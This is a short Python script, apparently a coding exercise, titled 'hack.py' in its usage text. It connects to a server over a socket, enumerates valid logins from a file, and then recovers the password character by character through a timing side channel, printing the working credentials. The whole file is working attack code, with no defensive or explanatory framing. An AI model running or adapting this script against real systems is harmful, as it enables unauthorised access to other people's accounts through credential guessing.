import os
import socket
import sys
import json
import string
import time

def reading_file():  # reads file and makes list of logins
    with open(os.path.join(os.getcwd(), 'logins.txt'), 'r') as f:
        logins = []
        for line in f.readlines():
            logins.append(line.strip())
        return logins


def main():
    if len(sys.argv) != 3:
        print('Usage: python3 hack.py address port message')
        sys.exit()
    address = sys.argv[1]
    port = sys.argv[2]
    list_logins = reading_file()

    # Set up the connection
    with socket.socket() as client:
        client.connect((address, int(port)))
        for login in list_logins:
            data = json.dumps({"login": login, "password": " "})
            client.send(data.encode(encoding='utf-8'))
            response = client.recv(1024).decode(encoding='utf-8')
            if response == '{"result": "Wrong password!"}':
                break
        password = ""
        chars = string.ascii_letters + "0123456789"
        while response != '{"result": "Connection success!"}':
            for i in chars:
                data = json.dumps({"login": login, "password": password + str(i)})
                start = time.perf_counter()
                client.send(data.encode(encoding='utf-8'))
                response = client.recv(1024).decode(encoding='utf-8')
                end = time.perf_counter()
                if end - start >= 0.1:
                    password += str(i)
                if response == '{"result": "Connection success!"}':
                    print(data)
                    break


if __name__ == '__main__':
    main()

